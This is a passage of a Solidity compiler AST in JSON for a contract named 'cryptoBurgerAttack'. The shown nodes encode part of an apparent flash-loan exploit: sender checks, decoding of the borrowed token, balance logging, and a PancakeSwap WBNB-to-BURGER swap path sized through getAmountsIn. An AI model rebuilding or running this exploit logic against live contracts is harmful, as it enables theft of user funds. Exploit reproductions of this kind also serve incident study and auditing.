                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_5b4592212d0bf5c501b88a4fad5457fec338aa666fc1eee4fb1ccbcfced29000",
                          "typeString": "literal_string \"Not a pair contract!\""
                        }
                      ],
                      "id": 189,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "2331:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 195,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2331:51:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 196,
                  "nodeType": "ExpressionStatement",
                  "src": "2331:51:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 203,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "id": 198,
                          "name": "_sender",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 151,
                          "src": "2400:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "arguments": [
                            {
                              "id": 201,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -28,
                              "src": "2419:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                "typeString": "contract cryptoBurgerAttack"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                "typeString": "contract cryptoBurgerAttack"
                              }
                            ],
                            "id": 200,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "2411:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 199,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "2411:7:0",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 202,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2411:13:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "2400:24:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "2173656e646572",
                        "id": 204,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2426:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_ba3731b74be2e577d98006e247e4c0f891336a09a838720fda4da4748c2578eb",
                          "typeString": "literal_string \"!sender\""
                        },
                        "value": "!sender"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_ba3731b74be2e577d98006e247e4c0f891336a09a838720fda4da4748c2578eb",
                          "typeString": "literal_string \"!sender\""
                        }
                      ],
                      "id": 197,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "2392:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 205,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2392:44:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 206,
                  "nodeType": "ExpressionStatement",
                  "src": "2392:44:0"
                },
                {
                  "assignments": [
                    208,
                    210
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 208,
                      "mutability": "mutable",
                      "name": "tokenBorrow",
                      "nameLocation": "2456:11:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1398,
                      "src": "2448:19:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 207,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "2448:7:0",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    },
                    {
                      "constant": false,
                      "id": 210,
                      "mutability": "mutable",
                      "name": "amount",
                      "nameLocation": "2477:6:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1398,
                      "src": "2469:14:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 209,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "2469:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 220,
                  "initialValue": {
                    "arguments": [
                      {
                        "id": 213,
                        "name": "_data",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 157,
                        "src": "2511:5:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes_calldata_ptr",
                          "typeString": "bytes calldata"
                        }
                      },
                      {
                        "components": [
                          {
                            "id": 215,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "2531:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 214,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "2531:7:0",
                              "typeDescriptions": {}
                            }
                          },
                          {
                            "id": 217,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "2540:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_uint256_$",
                              "typeString": "type(uint256)"
                            },
                            "typeName": {
                              "id": 216,
                              "name": "uint256",
                              "nodeType": "ElementaryTypeName",
                              "src": "2540:7:0",
                              "typeDescriptions": {}
                            }
                          }
                        ],
                        "id": 218,
                        "isConstant": false,
                        "isInlineArray": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "TupleExpression",
                        "src": "2530:18:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_tuple$_t_type$_t_address_$_$_t_type$_t_uint256_$_$",
                          "typeString": "tuple(type(address),type(uint256))"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bytes_calldata_ptr",
                          "typeString": "bytes calldata"
                        },
                        {
                          "typeIdentifier": "t_tuple$_t_type$_t_address_$_$_t_type$_t_uint256_$_$",
                          "typeString": "tuple(type(address),type(uint256))"
                        }
                      ],
                      "expression": {
                        "id": 211,
                        "name": "abi",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -1,
                        "src": "2487:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_abi",
                          "typeString": "abi"
                        }
                      },
                      "id": 212,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "memberName": "decode",
                      "nodeType": "MemberAccess",
                      "src": "2487:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_abidecode_pure$__$returns$__$",
                        "typeString": "function () pure"
                      }
                    },
                    "id": 219,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2487:71:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$_t_address_payable_$_t_uint256_$",
                      "typeString": "tuple(address payable,uint256)"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2447:111:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "436f6e74726163742062616c616e6365206973",
                        "id": 222,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2614:21:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_3952afae31788e0914f4ce769507e740f319965b8d31662ca6a5ee11ebc36b89",
                          "typeString": "literal_string \"Contract balance is\""
                        },
                        "value": "Contract balance is"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 225,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -28,
                              "src": "2645:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                "typeString": "contract cryptoBurgerAttack"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                "typeString": "contract cryptoBurgerAttack"
                              }
                            ],
                            "id": 224,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "2637:7:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 223,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "2637:7:0",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 226,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2637:13:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 227,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "balance",
                        "nodeType": "MemberAccess",
                        "src": "2637:21:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_3952afae31788e0914f4ce769507e740f319965b8d31662ca6a5ee11ebc36b89",
                          "typeString": "literal_string \"Contract balance is\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 221,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "2610:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 228,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2610:49:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 229,
                  "nodeType": "EmitStatement",
                  "src": "2605:54:0"
                },
                {
                  "assignments": [
                    231
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 231,
                      "mutability": "mutable",
                      "name": "max_BURG_amount",
                      "nameLocation": "2707:15:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1398,
                      "src": "2699:23:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 230,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "2699:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 235,
                  "initialValue": {
                    "commonType": {
                      "typeIdentifier": "t_rational_19999000000000000000000_by_1",
                      "typeString": "int_const 19999000000000000000000"
                    },
                    "id": 234,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "lValueRequested": false,
                    "leftExpression": {
                      "hexValue": "3139393939",
                      "id": 232,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "2725:5:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_19999_by_1",
                        "typeString": "int_const 19999"
                      },
                      "value": "19999"
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "*",
                    "rightExpression": {
                      "hexValue": "31653138",
                      "id": 233,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "2733:4:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1000000000000000000_by_1",
                        "typeString": "int_const 1000000000000000000"
                      },
                      "value": "1e18"
                    },
                    "src": "2725:12:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_rational_19999000000000000000000_by_1",
                      "typeString": "int_const 19999000000000000000000"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2699:38:0"
                },
                {
                  "assignments": [
                    240
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 240,
                      "mutability": "mutable",
                      "name": "path",
                      "nameLocation": "2765:4:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1398,
                      "src": "2748:21:0",
                      "stateVariable": false,
                      "storageLocation": "memory",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                        "typeString": "address[]"
                      },
                      "typeName": {
                        "baseType": {
                          "id": 238,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "2748:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 239,
                        "nodeType": "ArrayTypeName",
                        "src": "2748:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_array$_t_address_$dyn_storage_ptr",
                          "typeString": "address[]"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 241,
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2748:21:0"
                },
                {
                  "expression": {
                    "id": 248,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 242,
                      "name": "path",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 240,
                      "src": "2779:4:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                        "typeString": "address[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "hexValue": "32",
                          "id": 246,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "2800:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_2_by_1",
                            "typeString": "int_const 2"
                          },
                          "value": "2"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_2_by_1",
                            "typeString": "int_const 2"
                          }
                        ],
                        "id": 245,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "NewExpression",
                        "src": "2786:13:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_array$_t_address_$dyn_memory_ptr_$",
                          "typeString": "function (uint256) pure returns (address[] memory)"
                        },
                        "typeName": {
                          "baseType": {
                            "id": 243,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "2790:7:0",
                            "stateMutability": "nonpayable",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "id": 244,
                          "nodeType": "ArrayTypeName",
                          "src": "2790:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_storage_ptr",
                            "typeString": "address[]"
                          }
                        }
                      },
                      "id": 247,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "2786:16:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                        "typeString": "address[] memory"
                      }
                    },
                    "src": "2779:23:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                      "typeString": "address[] memory"
                    }
                  },
                  "id": 249,
                  "nodeType": "ExpressionStatement",
                  "src": "2779:23:0"
                },
                {
                  "expression": {
                    "id": 254,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "baseExpression": {
                        "id": 250,
                        "name": "path",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 240,
                        "src": "2813:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                          "typeString": "address[] memory"
                        }
                      },
                      "id": 252,
                      "indexExpression": {
                        "hexValue": "30",
                        "id": 251,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2818:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      "isConstant": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": true,
                      "nodeType": "IndexAccess",
                      "src": "2813:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 253,
                      "name": "WBNB",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 40,
                      "src": "2823:4:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "2813:14:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 255,
                  "nodeType": "ExpressionStatement",
                  "src": "2813:14:0"
                },
                {
                  "expression": {
                    "id": 260,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "baseExpression": {
                        "id": 256,
                        "name": "path",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 240,
                        "src": "2837:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                          "typeString": "address[] memory"
                        }
                      },
                      "id": 258,
                      "indexExpression": {
                        "hexValue": "31",
                        "id": 257,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2842:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_1_by_1",
                          "typeString": "int_const 1"
                        },
                        "value": "1"
                      },
                      "isConstant": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": true,
                      "nodeType": "IndexAccess",
                      "src": "2837:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 259,
                      "name": "BURGER",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 46,
                      "src": "2847:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "2837:16:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 261,
                  "nodeType": "ExpressionStatement",
                  "src": "2837:16:0"
                },
                {
                  "assignments": [
                    266
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 266,
                      "mutability": "mutable",
                      "name": "howMuchIneed",
                      "nameLocation": "2881:12:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 1398,
                      "src": "2864:29:0",
                      "stateVariable": false,
                      "storageLocation": "memory",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[]"
                      },
                      "typeName": {
                        "baseType": {
                          "id": 264,
                          "name": "uint256",
                          "nodeType": "ElementaryTypeName",
                          "src": "2864:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 265,
                        "nodeType": "ArrayTypeName",
                        "src": "2864:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_array$_t_uint256_$dyn_storage_ptr",
                          "typeString": "uint256[]"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 267,
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2864:29:0"
                },
                {
                  "expression": {
                    "id": 276,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 268,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "2903:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 273,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "2982:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 274,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "3011:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 270,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "2935:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 269,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "2918:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 271,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2918:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 272,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "2918:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 275,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "2918:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "2903:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 277,
                  "nodeType": "ExpressionStatement",
                  "src": "2903:122:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422062616c616e6365206f6620636f6e74726163742061667465722072656365697676696e6720666c6173686c6f616e",
                        "id": 279,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3058:53:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_7fa27182f244b0811dd0a3e7fbcebd3c53d2bb60301217ab7e7523a5db6d64b7",
                          "typeString": "literal_string \"WBNB balance of contract after receivving flashloan\""
                        },
                        "value": "WBNB balance of contract after receivving flashloan"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 284,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "3158:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 283,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "3150:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 282,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "3150:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 285,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "3150:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 280,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "3125:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 281,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "3125:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 286,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3125:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_7fa27182f244b0811dd0a3e7fbcebd3c53d2bb60301217ab7e7523a5db6d64b7",
                          "typeString": "literal_string \"WBNB balance of contract after receivving flashloan\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 278,
                      "name": "LOG",
                      "nodeType": "Identifier",
